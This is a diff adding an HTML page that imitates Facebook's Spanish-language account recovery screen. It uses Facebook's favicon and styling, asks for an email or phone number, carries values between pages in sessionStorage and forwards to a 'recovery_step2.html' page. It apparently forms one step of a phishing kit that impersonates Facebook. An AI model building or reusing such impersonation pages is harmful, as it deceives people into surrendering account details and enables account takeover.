@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Recuperar cuenta • Facebook</title>
+    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yx/r/e9sqr8WnkCf.ico">
+    <style>
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body { font-family:Helvetica,Arial; background:#f0f2f5; min-height:100vh; display:flex; flex-direction:column; }
+        .header { background:white; padding:12px 20px; box-shadow:0 1px 3px rgba(0,0,0,0.1); display:flex; align-items:center; gap:12px; }
+        .fb-logo-small { width:40px; height:40px; background:#1877f2; border-radius:50%; display:flex; align-items:center; justify-content:center; color:white; font-size:24px; font-weight:bold; }
+        .main { flex:1; display:flex; align-items:center; justify-content:center; padding:20px; }
+        .card { background:white; border-radius:8px; box-shadow:0 2px 8px rgba(0,0,0,0.1); max-width:500px; width:100%; padding:24px; }
+        h2 { font-size:20px; margin-bottom:8px; }
+        .sub { color:#65676b; margin-bottom:20px; }
+        .input-group { margin-bottom:20px; }
+        label { font-weight:500; margin-bottom:6px; display:block; }
+        input { width:100%; padding:14px; font-size:16px; border:1px solid #ccd0d5; border-radius:6px; }
+        input:focus { border-color:#1877f2; outline:none; box-shadow:0 0 0 2px rgba(24,119,242,0.2); }
+        .actions { display:flex; justify-content:flex-end; gap:12px; margin-top:24px; padding-top:16px; border-top:1px solid #dadde1; }
+        .btn-cancel { background:none; border:none; color:#1877f2; font-weight:600; padding:10px 16px; cursor:pointer; border-radius:6px; }
+        .btn-continue { background:#1877f2; color:white; border:none; padding:10px 20px; font-weight:600; border-radius:6px; cursor:pointer; }
+        @media (max-width:480px) { .card { padding:16px; } }
+    </style>
+</head>
+<body>
+    <header class="header">
+        <div class="fb-logo-small">f</div>
+        <div style="font-size:20px;">Recuperar cuenta</div>
+    </header>
+    <main class="main">
+        <div class="card">
+            <h2>Buscar tu cuenta</h2>
+            <p class="sub">Introduce tu correo electrónico o número de teléfono para buscar tu cuenta.</p>
+            <form id="recoveryForm" action="recovery_step2.html" method="GET">
+                <div class="input-group">
+                    <label>Correo electrónico o número de teléfono</label>
+                    <input type="text" name="contact" id="contactInput" placeholder="ejemplo@email.com" required>
+                </div>
+                <div class="actions">
+                    <button type="button" class="btn-cancel" onclick="window.location.href='index.html'">Cancelar</button>
+                    <button type="submit" class="btn-continue">Buscar</button>
+                </div>
+            </form>
+        </div>
+    </main>
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const emailParam = urlParams.get('email');
+        if (emailParam) document.getElementById('contactInput').value = decodeURIComponent(emailParam);
+        const storedEmail = sessionStorage.getItem('fb_email');
+        if (storedEmail && !emailParam) document.getElementById('contactInput').value = storedEmail;
+        document.getElementById('recoveryForm').addEventListener('submit', function(e) {
+            sessionStorage.setItem('fb_recovery_contact', document.getElementById('contactInput').value);
+        });
+    </script>
+</body>
+</html>
